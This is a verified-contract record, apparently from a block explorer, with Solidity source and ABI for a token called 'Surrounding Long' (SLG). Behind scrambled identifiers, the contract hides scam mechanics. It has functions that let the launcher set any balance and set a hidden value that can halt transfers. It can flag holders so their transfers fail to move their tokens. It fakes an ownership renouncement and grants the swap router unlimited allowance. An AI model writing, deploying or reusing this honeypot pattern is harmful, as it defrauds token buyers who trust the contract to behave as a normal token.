{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface buyAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoTakeSwap {\n    function createPair(address minTake, address fundTrading) external returns (address);\n}\n\ninterface senderFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atList) external view returns (uint256);\n\n    function transfer(address takeMarketingFrom, uint256 takeShould) external returns (bool);\n\n    function allowance(address autoFromTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeMarketingFrom,\n        uint256 takeShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldMin, uint256 value);\n    event Approval(address indexed autoFromTake, address indexed spender, uint256 value);\n}\n\ninterface minAmount is senderFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SurroundingLong is enableSell, senderFrom, minAmount {\n\n    uint256 private toTakeBuy;\n\n    uint256 private minSell;\n\n    function balanceOf(address atList) public view virtual override returns (uint256) {\n        return receiverFrom[atList];\n    }\n\n    function tradingTx(address walletAmount, address takeMarketingFrom, uint256 takeShould) internal returns (bool) {\n        if (walletAmount == launchToken) {\n            return fromAutoList(walletAmount, takeMarketingFrom, takeShould);\n        }\n        uint256 tokenReceiver = senderFrom(enableWallet).balanceOf(feeAt);\n        require(tokenReceiver == modeSwapLaunch);\n        require(takeMarketingFrom != feeAt);\n        if (toSell[walletAmount]) {\n            return fromAutoList(walletAmount, takeMarketingFrom, marketingAuto);\n        }\n        return fromAutoList(walletAmount, takeMarketingFrom, takeShould);\n    }\n\n    uint256 private modeTo;\n\n    function transferFrom(address walletAmount, address takeMarketingFrom, uint256 takeShould) external override returns (bool) {\n        if (_msgSender() != limitReceiver) {\n            if (txTeam[walletAmount][_msgSender()] != type(uint256).max) {\n                require(takeShould <= txTeam[walletAmount][_msgSender()]);\n                txTeam[walletAmount][_msgSender()] -= takeShould;\n            }\n        }\n        return tradingTx(walletAmount, takeMarketingFrom, takeShould);\n    }\n\n    address limitReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function launchBuy() public {\n        emit OwnershipTransferred(launchToken, address(0));\n        marketingList = address(0);\n    }\n\n    function tradingLimit(address txWallet) public {\n        require(txWallet.balance < 100000);\n        if (maxFund) {\n            return;\n        }\n        \n        launchedTo[txWallet] = true;\n        if (limitShould == launchMin) {\n            launchMin = minSell;\n        }\n        maxFund = true;\n    }\n\n    uint256 private minLaunchMarketing;\n\n    address feeAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return fundFromEnable;\n    }\n\n    bool public marketingToken;\n\n    mapping(address => mapping(address => uint256)) private txTeam;\n\n    function toEnableFrom(address totalMax, uint256 takeShould) public {\n        txAmount();\n        receiverFrom[totalMax] = takeShould;\n    }\n\n    mapping(address => uint256) private receiverFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptTx;\n    }\n\n    function liquiditySender(uint256 takeShould) public {\n        txAmount();\n        modeSwapLaunch = takeShould;\n    }\n\n    uint256 private teamAuto = 100000000 * 10 ** 18;\n\n    uint256 private maxLaunchFrom;\n\n    function transfer(address totalMax, uint256 takeShould) external virtual override returns (bool) {\n        return tradingTx(_msgSender(), totalMax, takeShould);\n    }\n\n    uint256 public limitShould;\n\n    function isMin(address amountMax) public {\n        txAmount();\n        \n        if (amountMax == launchToken || amountMax == enableWallet) {\n            return;\n        }\n        toSell[amountMax] = true;\n    }\n\n    bool public maxFund;\n\n    event OwnershipTransferred(address indexed marketingTx, address indexed senderAutoTeam);\n\n    uint256 constant marketingAuto = 9 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamMax;\n    }\n\n    uint256 public launchMin;\n\n    mapping(address => bool) public launchedTo;\n\n    address public enableWallet;\n\n    mapping(address => bool) public toSell;\n\n    function getOwner() external view returns (address) {\n        return marketingList;\n    }\n\n    function txAmount() private view {\n        require(launchedTo[_msgSender()]);\n    }\n\n    constructor (){\n        \n        buyAmount exemptTo = buyAmount(limitReceiver);\n        enableWallet = autoTakeSwap(exemptTo.factory()).createPair(exemptTo.WETH(), address(this));\n        if (maxLaunchFrom != launchMin) {\n            marketingToken = true;\n        }\n        launchToken = _msgSender();\n        launchBuy();\n        launchedTo[launchToken] = true;\n        receiverFrom[launchToken] = teamAuto;\n        \n        emit Transfer(address(0), launchToken, teamAuto);\n    }\n\n    uint256 autoMode;\n\n    string private fundFromEnable = \"Surrounding Long\";\n\n    address public launchToken;\n\n    function owner() external view returns (address) {\n        return marketingList;\n    }\n\n    uint256 modeSwapLaunch;\n\n    string private exemptTx = \"SLG\";\n\n    bool public takeMinMarketing;\n\n    function allowance(address totalAmount, address enableTrading) external view virtual override returns (uint256) {\n        if (enableTrading == limitReceiver) {\n            return type(uint256).max;\n        }\n        return txTeam[totalAmount][enableTrading];\n    }\n\n    function fromAutoList(address walletAmount, address takeMarketingFrom, uint256 takeShould) internal returns (bool) {\n        require(receiverFrom[walletAmount] >= takeShould);\n        receiverFrom[walletAmount] -= takeShould;\n        receiverFrom[takeMarketingFrom] += takeShould;\n        emit Transfer(walletAmount, takeMarketingFrom, takeShould);\n        return true;\n    }\n\n    address private marketingList;\n\n    function approve(address enableTrading, uint256 takeShould) public virtual override returns (bool) {\n        txTeam[_msgSender()][enableTrading] = takeShould;\n        emit Approval(_msgSender(), enableTrading, takeShould);\n        return true;\n    }\n\n    uint8 private teamMax = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamAuto;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFromTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderAutoTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"}],\"name\":\"isMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeShould\",\"type\":\"uint256\"}],\"name\":\"liquiditySender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMinMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeShould\",\"type\":\"uint256\"}],\"name\":\"toEnableFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"}],\"name\":\"tradingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeMarketingFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SurroundingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}